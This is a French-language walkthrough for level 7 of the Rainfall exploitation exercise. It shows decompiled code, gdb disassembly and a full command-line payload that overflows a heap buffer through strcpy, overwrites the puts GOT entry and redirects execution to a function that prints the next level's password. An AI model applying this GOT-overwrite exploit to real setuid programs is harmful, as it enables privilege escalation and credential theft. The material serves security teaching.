### README pour le Niveau 7 du Projet Rainfall

#### Objectif

L'objectif du niveau 7 est d'exploiter une vulnérabilité de débordement de tampon dans un programme pour obtenir le mot de passe du niveau suivant. Vous devrez comprendre le fonctionnement du programme, identifier la vulnérabilité et construire un payload pour exploiter cette faille.

### 1. Analyser le Programme

Le programme est un exécutable avec les droits `SUID` qui lit un fichier de mot de passe et utilise des fonctions vulnérables comme `strcpy`. Voici le code désassemblé du programme :

```c
int m() {
    time_t v0;
    v0 = time(0);
    return printf("%s - %d\n", c, v0);
}

int __cdecl main(int argc, const char **argv, const char **envp) {
    FILE *v3;
    void *v5;
    void *v6;

    v6 = malloc(8u);
    *(_DWORD *)v6 = 1;
    *((_DWORD *)v6 + 1) = malloc(8u);
    v5 = malloc(8u);
    *(_DWORD *)v5 = 2;
    *((_DWORD *)v5 + 1) = malloc(8u);
    strcpy(*((char **)v6 + 1), argv[1]);
    strcpy(*((char **)v5 + 1), argv[2]);
    v3 = fopen("/home/user/level8/.pass", "r");
    fgets(c, 68, v3);
    puts("~~");
    return 0;
}
```

### 2. Comprendre le Global Offset Table (GOT)

Le Global Offset Table (GOT) est une structure de données utilisée par les programmes pour stocker les adresses des fonctions externes utilisées. Lorsqu'une fonction est appelée pour la première fois, son adresse est résolue et stockée dans le GOT. Les appels suivants utilisent cette adresse stockée pour accéder directement à la fonction.

**Pourquoi c'est important ?**

En écrasant les entrées du GOT, nous pouvons rediriger l'exécution du programme vers une fonction différente. Cela nous permet de détourner le flux d'exécution pour atteindre notre objectif.

### 3. Utiliser `gdb` pour l'Analyse

Pour commencer l'analyse, nous utilisons `gdb` (GNU Debugger) pour examiner le programme.

#### Étapes avec `gdb`

1. **Lancer `gdb` sur le binaire**

```bash
gdb -q level7
```

2. **Lister les fonctions disponibles**

```gdb
(gdb) info functions
```

Vous verrez les adresses des fonctions importantes :
```
0x080484f4  m
0x08048521  main
```

3. **Examiner la fonction `main`**

```gdb
(gdb) disas main
```

Le code désassemblé de `main` montre les appels à `malloc` et `strcpy` :

```assembly
Dump of assembler code for function main:
   0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   0x08048524 <+3>:	and    $0xfffffff0,%esp
   0x08048527 <+6>:	sub    $0x20,%esp
   0x0804852a <+9>:	movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax
   0x08048596 <+117>:	mov    0x4(%eax),%eax
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
   0x080485a8 <+135>:	add    $0x8,%eax
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret    
End of assembler dump.
```

4. **Examiner la fonction `m`**

```gdb
(gdb) disas m
```

Le code désassemblé de `m` montre qu'il utilise `printf` pour afficher le contenu de la variable globale `c`.

```assembly
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl  

 $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret    
End of assembler dump.
```

### 4. Préparer et Exécuter le Payload

Nous utiliserons `strcpy` pour exploiter le débordement de tampon et écraser des adresses importantes en mémoire.

#### Identifier les Adresses Clés

1. **Obtenir l'adresse de la fonction `m`**

```gdb
(gdb) disas m
```

   - Adresse de `m` : `0x080484f4`

2. **Identifier l'adresse du GOT pour `puts`**

```gdb
(gdb) x/wx 0x8049928
```

   - Adresse du GOT pour `puts` : `0x08049928`

#### Préparer le Payload

1. **Préparer les Adresses en Little Endian**

   - Adresse de `m` : `0x080484f4` -> `\xf4\x84\x04\x08`
   - Adresse du GOT pour `puts` : `0x08049928` -> `\x28\x99\x04\x08`

2. **Construire les Arguments**

   - Premier Argument : Remplir les premiers octets avec `A` puis ajouter l'adresse du GOT pour `puts`.
   - Deuxième Argument : Ajouter l'adresse de `m`.

Voici la commande complète :

```bash
./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
```

#### Explication du Payload

1. **Premier Argument**
   - `'A'*20` : Remplit les premiers 20 octets avec `A`.
   - `\x28\x99\x04\x08` : Adresse du GOT pour `puts` en Little Endian.

2. **Deuxième Argument**
   - `\xf4\x84\x04\x08` : Adresse de `m` en Little Endian.

En exécutant cette commande, nous exploitons le débordement de tampon pour écraser le pointeur de fonction et rediriger l'exécution vers `m`, qui affichera le contenu de la variable globale `c` contenant le mot de passe.

### Conclusion

Ce niveau montre comment exploiter une vulnérabilité de débordement de tampon pour rediriger l'exécution d'un programme et obtenir des informations sensibles. En utilisant `gdb` et en comprenant le Global Offset Table (GOT), nous avons pu identifier et exploiter une faille critique.

Les compétences et outils utilisés ici sont essentiels pour l'analyse et l'exploitation des vulnérabilités dans la sécurité informatique. En suivant ces étapes, vous pouvez réussir le niveau 7 et progresser dans le projet Rainfall.